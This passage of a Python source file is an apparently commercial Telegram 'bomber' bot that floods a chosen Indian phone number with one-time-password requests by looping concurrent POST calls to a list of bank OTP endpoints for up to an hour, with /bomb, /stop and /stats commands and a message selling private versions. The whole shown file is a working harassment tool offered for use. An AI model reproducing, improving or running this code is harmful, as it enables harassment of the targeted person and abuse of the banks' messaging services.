        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Bank of India",
        "url": lambda p, d: "https://www.bankofindia.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "IDBI Bank",
        "url": lambda p, d: "https://www.idbibank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "UCO Bank",
        "url": lambda p, d: "https://www.ucobank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Indian Overseas Bank",
        "url": lambda p, d: "https://www.iob.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Punjab & Sind Bank",
        "url": lambda p, d: "https://www.psbindia.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    }
]

class BomberBot:
    def __init__(self):
        self.active_attacks = {}
    
    async def start_bombing(self, phone, duration, user_id):
        if user_id in self.active_attacks:
            return "⚠️ Already bombing! Use /stop first."
        
        if len(phone) != 10 or not phone.isdigit():
            return "❌ Invalid phone! Send 10 digit number."
        
        self.active_attacks[user_id] = {
            "phone": phone, 
            "running": True,
            "start_time": time.time(),
            "success": 0,
            "failed": 0,
            "cycles": 0
        }
        
        asyncio.create_task(self._bomb_worker(user_id, phone, duration))
        
        return (f"💀 IntelX BOMBING STARTED!\n\n"
                f"📱 Target: +91{phone}\n" 
                f"⏰ Duration: {duration} min\n"
                f"📡 APIs: {len(APIS)}\n"
                f"🔄 Auto-Repeat: YES\n\n"
                f"🛑 Use /stop to stop")
    
    async def stop_bombing(self, user_id):
        if user_id in self.active_attacks:
            stats = self.active_attacks[user_id]
            stats["running"] = False
            duration = time.time() - stats["start_time"]
            del self.active_attacks[user_id]
            
            return (f"🛑 BOMBING STOPPED!\n\n"
                    f"✅ Success: {stats['success']}\n"
                    f"❌ Failed: {stats['failed']}\n" 
                    f"🔄 Cycles: {stats['cycles']}\n"
                    f"⏰ Duration: {duration:.1f}s\n"
                    f"📱 Target: +91{stats['phone']}")
        return "⚠️ No active bombing!"
    
    async def get_stats(self, user_id):
        if user_id in self.active_attacks:
            stats = self.active_attacks[user_id]
            duration = time.time() - stats["start_time"]
            return (f"📊 LIVE STATS:\n\n"
                    f"✅ Success: {stats['success']}\n"
                    f"❌ Failed: {stats['failed']}\n"
                    f"🔄 Cycles: {stats['cycles']}\n" 
                    f"⏰ Duration: {duration:.1f}s\n"
                    f"📱 Target: +91{stats['phone']}\n"
                    f"⚡ Status: RUNNING...")
        return "ℹ️ No active bombing. Use /bomb to start."
    
    async def _bomb_worker(self, user_id, phone, duration):
        end_time = time.time() + (duration * 60)
        
        while (user_id in self.active_attacks and 
               self.active_attacks[user_id]["running"] and 
               time.time() < end_time):
            
            try:
                self.active_attacks[user_id]["cycles"] += 1
                
                async with aiohttp.ClientSession() as session:
                    tasks = []
                    for api in APIS:
                        if not self.active_attacks[user_id]["running"]:
                            break
                        
                        url = api["url"](phone, duration)
                        headers = api.get("headers", {})
                        data = api["data"](phone, duration) if "data" in api else None
                        
                        task = self._send_request(session, url, api["method"], headers, data, api["name"])
                        tasks.append(task)
                    
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    for success in results:
                        if isinstance(success, bool) and success:
                            self.active_attacks[user_id]["success"] += 1
                        else:
                            self.active_attacks[user_id]["failed"] += 1
                
                await asyncio.sleep(2)
                
            except Exception as e:
                print(f"Bombing error: {e}")
                await asyncio.sleep(5)
        
        if user_id in self.active_attacks:
            self.active_attacks[user_id]["running"] = False
    
    async def _send_request(self, session, url, method, headers, data, api_name):
        try:
            if method == "POST":
                async with session.post(url, headers=headers, data=data, timeout=10) as response:
                    print(f"✅ {api_name} - Status: {response.status}")
                    return response.status in [200, 201, 202]
            else:
                async with session.get(url, headers=headers, timeout=10) as response:
                    print(f"✅ {api_name} - Status: {response.status}")
                    return response.status in [200, 201, 202]
        except Exception as e:
            print(f"❌ {api_name} - Failed: {e}")
            return False

# Initialize bot
bomber = BomberBot()

# Telegram handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
    "💀 IntelX BOMBER BOT - 150 APIS\n\n"
    "📜 Commands:\n"
    "/bomb <phone> <duration> - Start bombing\n"
    "/stop - Stop bombing\n"
    "/stats - Show stats\n\n"
    "🎯 Example:\n"
    "/bomb 9876543210 5\n\n"
    "⚡ 150 APIs Loaded!\n"
    "⚠️ Use responsibly!\n\n"
    "This is Trial, Personal Boomber Banwana Ho to dm @pankajccc\n"
    "FIX PRICE DM me. ON HOLI SALE ⚡"
)
async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if len(context.args) != 2:
        await update.message.reply_text("❌ Usage: /bomb <phone> <duration>\nExample: /bomb 9876543210 5")
        return
    
    phone, duration = context.args
    
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Invalid phone number! Please enter 10 digits.")
        return
    
    try:
        duration = int(duration)
        if duration <= 0 or duration > 60:
            await update.message.reply_text("❌ Invalid duration! Use 1-60 minutes.")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid duration! Use numbers only.")
        return
    
    result = await bomber.start_bombing(phone, duration, user_id)
    await update.message.reply_text(result)

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    result = await bomber.stop_bombing(user_id)
    await update.message.reply_text(result)

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    result = await bomber.get_stats(user_id)
    await update.message.reply_text(result)

def main():
    try:
        app = Application.builder().token(BOT_TOKEN).build()
        
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("bomb", bomb))
        app.add_handler(CommandHandler("stop", stop))
        app.add_handler(CommandHandler("stats", stats))
        
        print("🤖 IntelX BOMBER BOT STARTED!")
        print(f"📡 Loaded {len(APIS)} APIs")
        
        # Run the bot
        app.run_polling(drop_pending_updates=True)
        
    except Exception as e:
        print(f"❌ Bot failed to start: {e}")

if __name__ == "__main__":
    main()
        
       